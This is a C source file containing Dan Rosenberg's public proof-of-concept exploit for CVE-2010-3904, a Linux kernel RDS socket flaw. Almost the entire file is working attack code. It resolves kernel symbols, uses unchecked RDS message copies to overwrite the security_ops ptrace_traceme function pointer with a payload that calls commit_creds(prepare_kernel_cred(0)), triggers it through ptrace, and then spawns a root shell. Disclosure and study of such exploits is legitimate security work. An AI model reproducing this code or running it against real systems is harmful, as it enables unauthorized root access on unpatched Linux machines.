// source: http://www.vsecurity.com/resources/advisory/20101019-1/

/*
 * Linux Kernel <= 2.6.36-rc8 RDS privilege escalation exploit
 * CVE-2010-3904
 * by Dan Rosenberg <drosenberg@vsecurity.com>
 *
 * Copyright 2010 Virtual Security Research, LLC
 *
 * The handling functions for sending and receiving RDS messages
 * use unchecked __copy_*_user_inatomic functions without any
 * access checks on user-provided pointers.  As a result, by
 * passing a kernel address as an iovec base address in recvmsg-style
 * calls, a local user can overwrite arbitrary kernel memory, which
 * can easily be used to escalate privileges to root.  Alternatively,
 * an arbitrary kernel read can be performed via sendmsg calls.
 *
 * This exploit is simple - it resolves a few kernel symbols,
 * sets the security_ops to the default structure, then overwrites
 * a function pointer (ptrace_traceme) in that structure to point
 * to the payload.  After triggering the payload, the original
 * value is restored.  Hard-coding the offset of this function
 * pointer is a bit inelegant, but I wanted to keep it simple and
 * architecture-independent (i.e. no inline assembly).
 *
 * The vulnerability is yet another example of why you shouldn't
 * allow loading of random packet families unless you actually
 * need them.
 *
 * Greets to spender, kees, taviso, hawkes, team lollerskaters,
 * joberheide, bla, sts, and VSR
 *
 */


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/utsname.h>

#define RECVPORT 5555
#define SENDPORT 6666

int prep_sock(int port)
{

	int s, ret;
	struct sockaddr_in addr;

	s = socket(PF_RDS, SOCK_SEQPACKET, 0);

	if(s < 0) {
		printf("[*] Could not open socket.\n");
		exit(-1);
	}

	memset(&addr, 0, sizeof(addr));

	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	ret = bind(s, (struct sockaddr *)&addr, sizeof(addr));

	if(ret < 0) {
		printf("[*] Could not bind socket.\n");
		exit(-1);
	}

	return s;

}

void get_message(unsigned long address, int sock)
{

	recvfrom(sock, (void *)address, sizeof(void *), 0,
		 NULL, NULL);

}

void send_message(unsigned long value, int sock)
{

	int size, ret;
	struct sockaddr_in recvaddr;
	struct msghdr msg;
	struct iovec iov;
	unsigned long buf;

	memset(&recvaddr, 0, sizeof(recvaddr));

	size = sizeof(recvaddr);

	recvaddr.sin_port = htons(RECVPORT);
	recvaddr.sin_family = AF_INET;
	recvaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

	memset(&msg, 0, sizeof(msg));

	msg.msg_name = &recvaddr;
	msg.msg_namelen = sizeof(recvaddr);
	msg.msg_iovlen = 1;

	buf = value;

	iov.iov_len = sizeof(buf);
	iov.iov_base = &buf;

	msg.msg_iov = &iov;

	ret = sendmsg(sock, &msg, 0);
	if(ret < 0) {
		printf("[*] Something went wrong sending.\n");
		exit(-1);
	}
}

void write_to_mem(unsigned long addr, unsigned long value, int sendsock, int recvsock)
{

	if(!fork()) {
			sleep(1);
			send_message(value, sendsock);
			exit(1);
	}
	else {
		get_message(addr, recvsock);
		wait(NULL);
	}

}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

int __attribute__((regparm(3)))
getroot(void * file, void * vma)
{

	commit_creds(prepare_kernel_cred(0));
	return -1;

}

/* thanks spender... */
unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	struct utsname ver;
	int ret;
	int rep = 0;
	int oldstyle = 0;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		if (f == NULL)
			goto fallback;
		oldstyle = 1;
	}

repeat:
	ret = 0;
	while(ret != EOF) {
		if (!oldstyle)
			ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		else {
			ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
			if (ret == 2) {
				char *p;
				if (strstr(sname, "_O/") || strstr(sname, "_S."))
					continue;
				p = strrchr(sname, '_');
				if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
					p = p - 4;
					while (p > (char *)sname && *(p - 1) == '_')
						p--;
					*p = '\0';
				}
			}
		}
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			fprintf(stdout, " [+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	if (rep)
		return 0;
fallback:
	/* didn't find the symbol, let's retry with the System.map
	   dedicated to the pointlessness of Russell Coker's SELinux
	   test machine (why does he keep upgrading the kernel if
	   "all necessary security can be provided by SE Linux"?)
	*/
	uname(&ver);
	if (strncmp(ver.release, "2.6", 3))
		oldstyle = 1;
	sprintf(sname, "/boot/System.map-%s", ver.release);
	f = fopen(sname, "r");
	if (f == NULL)
		return 0;
	rep = 1;
	goto repeat;
}

int main(int argc, char * argv[])
{
	unsigned long sec_ops, def_ops, cap_ptrace, target;
	int sendsock, recvsock;
	struct utsname ver;

	printf("[*] Linux kernel >= 2.6.30 RDS socket exploit\n");
	printf("[*] by Dan Rosenberg\n");

	uname(&ver);

	if(strncmp(ver.release, "2.6.3", 5)) {
		printf("[*] Your kernel is not vulnerable.\n");
		return -1;
	}

	/* Resolve addresses of relevant symbols */
	printf("[*] Resolving kernel addresses...\n");
	sec_ops = get_kernel_sym("security_ops");
	def_ops = get_kernel_sym("default_security_ops");
	cap_ptrace = get_kernel_sym("cap_ptrace_traceme");
	commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
	prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");

	if(!sec_ops || !def_ops || !cap_ptrace || !commit_creds || !prepare_kernel_cred) {
		printf("[*] Failed to resolve kernel symbols.\n");
		return -1;
	}

	/* Calculate target */
	target = def_ops + sizeof(void *) + ((11 + sizeof(void *)) & ~(sizeof(void *) - 1));

	sendsock = prep_sock(SENDPORT);
	recvsock = prep_sock(RECVPORT);

	/* Reset security ops */
	printf("[*] Overwriting security ops...\n");
	write_to_mem(sec_ops, def_ops, sendsock, recvsock);

	/* Overwrite ptrace_traceme security op fptr */
	printf("[*] Overwriting function pointer...\n");
	write_to_mem(target, (unsigned long)&getroot, sendsock, recvsock);

	/* Trigger the payload */
	printf("[*] Triggering payload...\n");
	ptrace(PTRACE_TRACEME, 1, NULL, NULL);

	/* Restore the ptrace_traceme security op */
	printf("[*] Restoring function pointer...\n");
	write_to_mem(target, cap_ptrace, sendsock, recvsock);

	if(getuid()) {
		printf("[*] Exploit failed to get root.\n");
		return -1;
	}

	printf("[*] Got root!\n");
	execl("/bin/sh", "sh", NULL);

}